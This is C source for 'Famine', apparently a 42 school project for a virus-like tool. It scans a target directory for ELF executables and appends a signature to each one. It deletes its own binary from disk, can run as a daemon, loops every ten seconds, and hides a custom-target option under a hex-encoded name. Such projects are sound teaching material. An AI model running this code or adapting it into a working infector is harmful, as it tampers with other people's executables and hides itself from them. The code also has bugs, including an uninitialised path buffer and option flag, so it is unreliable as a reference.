/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   famine.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbrement <mbrement@student.42lyon.fr>      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/07/24 21:11:05 by mgama             #+#    #+#             */
/*   Updated: 2024/07/25 16:53:42 by mbrement         ###   ########lyon.fr   */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"
#include <stdio.h>

struct s_famine g_famine;
int g_exit = 0;

void	write_back_prog(void)
{
	int fd = open(g_famine.name, O_CREAT | O_WRONLY, 0755);
	if (fd < 0)
		return;
	write(fd, (char *)g_famine.me, g_famine.len);
	munmap(g_famine.me, g_famine.len);
}

void interruptHandler(int sig)
{
	(void)sig;
	// write_back_prog();
	g_exit = 1;
}

void famine(char *name, char *path)
{
	struct stat statbuf;

	const char elf_magic[] = {0x7f, 'E', 'L', 'F'};
	const char signature[] = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0              .\n           ,'/ \\`.\n          |\\/___\\/|\n          \\'\\   /`/\n           `.\\ /,'\n              |\n              |\n             |=|\n        /\\  ,|=|.  /\\\n    ,'`.  \\/ |=| \\/  ,'`.\n  ,'    `.|\\ `-' /|,'    `.\n,'   .-._ \\ `---' / _,-.   `.\n   ,'    `-`-._,-'-'    `.\n  '                       `\nFamine 1.5 by mbrement and mgama";
	const size_t elf_magic_size = sizeof(elf_magic);

	char full_path[PATH_MAX + 1 + PATH_MAX];
	if (path != NULL)
	{
		strcpy(full_path, path);
		strcat(full_path, "/");
	}
	strcat(full_path, name);
	if (lstat(full_path, &statbuf) == -1)
		return ;
    if (S_ISLNK(statbuf.st_mode))
		return ;

	int fd = open(full_path, O_RDWR);
	if (fd == -1)
		return ;
	char buf[elf_magic_size];
	size_t n = read(fd, buf, elf_magic_size);
	// check if read has an error or if the number of byte if less than `elf_magic_size`
	if (n <= 0 || n < elf_magic_size)
		return ;

	if (strncmp(buf, elf_magic, elf_magic_size) != 0)
	{
		close(fd);
		return ;
	}

	char sign_buf[sizeof(signature)];

	size_t pos = lseek(fd, 0, SEEK_END);
	lseek(fd, pos - sizeof(signature), SEEK_SET);
	// check if read has an error or if the number of byte if less than `sizeof(signature)`
	n = read(fd, sign_buf, sizeof(signature));
	if (n <= 0 || n < sizeof(signature))
		return ;

	size_t i = 0;
	while (signature[i] == sign_buf[i] && i < sizeof(signature))
		i++;

	if (i == sizeof(signature))
	{
		close(fd);
		return ;
	}

	lseek(fd, pos, SEEK_SET);
	write(fd, signature, sizeof(signature));
}

void	custom_target(char *target)
{
	struct stat statbuf;
	DIR *dir;

	if (target == NULL)
		return;

	if (lstat(target, &statbuf) == -1)
		return;
	if (S_ISREG(statbuf.st_mode))
	{
		famine(target, NULL);
		return;
	}
	dir = opendir(target);
	if (!dir)
		return;
	for (struct dirent *d = readdir(dir); d != NULL; d = readdir(dir))
	{
		famine(d->d_name, target);
	}
	closedir(dir);
}

int main(int argc, char **argv)
{
	const char no_xsec[] = "\x69\x6B\x6E\x6F\x77\x77\x68\x61\x74\x69\x61\x6D\x64\x6F\x69\x6E\x67";
	DIR *dir;
	struct dirent *d;
	struct stat stats;
	int ch, option;
	char *target = NULL;

	struct getopt_list_s optlist[] = {
        {"daemon", 'd', OPTPARSE_NONE},
        {"once", 'o', OPTPARSE_NONE},
        {no_xsec, 0, OPTPARSE_REQUIRED},
        {0}
    };
	struct getopt_s options;

    ft_getopt_init(&options, argv);
	while ((ch = ft_getopt(&options, optlist, NULL)) != -1) {
		switch (ch) {
			case 0:
				option |= F_CUSTOM;
				target = options.optarg;
				break;
			case 'd':
				option |= F_DAEMON;
				break;
			case 'o':
				option |= F_ONCE;
				break;
			default:
				exit(0);
		}
	}

	if (argc - options.optind != 0)
		return 0;

	int fd = open(argv[0], O_RDONLY);
	if (fd < 0)
		return 0;

	if (fstat(fd, &stats) < 0)
		return 0;

	g_famine.name = argv[0];
	g_famine.len = stats.st_size;
	g_famine.me = mmap(NULL, g_famine.len, PROT_READ, MAP_PRIVATE, fd, 0);
	close(fd);
	if (g_famine.me == NULL)
		return (write_back_prog(), 0);

	if (unlink(argv[0]) < 0)
		return (write_back_prog(), 0);

	if (option & F_DAEMON)
	{
		become_daemon(BD_NO_CHDIR | BD_NO_REOPEN_STD_FDS);
	}

	signal(SIGINT, interruptHandler);
	signal(SIGQUIT, interruptHandler);
	signal(SIGTERM, interruptHandler);

	do
	{
		if (option & F_CUSTOM)
		{
			if (FM_SECURITY == 0)
				break;

			custom_target(target);
			break;
		}

		dir = opendir(FM_TARGET);
		if (!dir)
			break;

		while ((d = readdir(dir)) != NULL)
			famine(d->d_name, FM_TARGET);
	
		closedir(dir);

		if (!(option & F_ONCE))
			sleep(10);
	} while(!g_exit && !(option & F_ONCE));

	return (write_back_prog(), 0);
}
